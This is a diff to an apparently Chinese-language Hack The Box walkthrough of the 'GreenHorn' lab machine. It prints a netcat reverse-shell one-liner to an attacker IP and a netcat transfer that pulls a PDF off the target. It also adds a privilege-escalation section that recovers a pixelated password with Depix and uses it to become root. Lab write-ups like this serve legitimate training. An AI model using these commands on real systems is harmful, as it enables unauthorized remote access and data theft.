@@ -51,7 +51,7 @@ tty，返回一个稳定shell
 ```
 /bin/sh -i
 
-rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.19 443 >/tmp/f
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.7 443 >/tmp/f
 ```
 
 找到一个密码：
@@ -80,7 +80,7 @@ uid=1000(junior) gid=1000(junior) groups=1000(junior)
 
 传输桌面的Using OpenVAS.pdf文件
 ```
-n	c -lvp 139 > 'Using OpenVAS.pdf'
+nc -lvp 139 > 'Using OpenVAS.pdf'
 nc 10.10.16.19 139 < 'Using OpenVAS.pdf'
 ```
 
@@ -97,5 +97,42 @@ sudo /usr/sbin/openvas
 
 junior is not in the sudoers file.  This incident will be reported.
 junior@greenhorn:~$ 
+
+```
+
+
+# 提权
+
+提取pdf里被遮挡的密码图片
+```
+pdfimages "./Using OpenVAS.pdf" greenhorn
+```
+
+使用[Depix](https://github.com/spipm/Depix)这个项目
+
+执行：
+```
+python3 depix.py \
+-p /root/htb/GreenHorn/greenhorn-000.ppm \
+-s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
+-o /root/htb/GreenHorn/output0.png
+
+```
+
+![](GreenHorn_files/6.jpg)
+
+得到明文：
+
+![](GreenHorn_files/7.jpg)
+
+注意密码要去掉空格：sidefromsidetheothersidesidefromsidetheotherside
+
+
+```
+$ su root
+Password: sidefromsidetheothersidesidefromsidetheotherside
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+id
+uid=0(root) gid=0(root) groups=0(root)
 
 ```
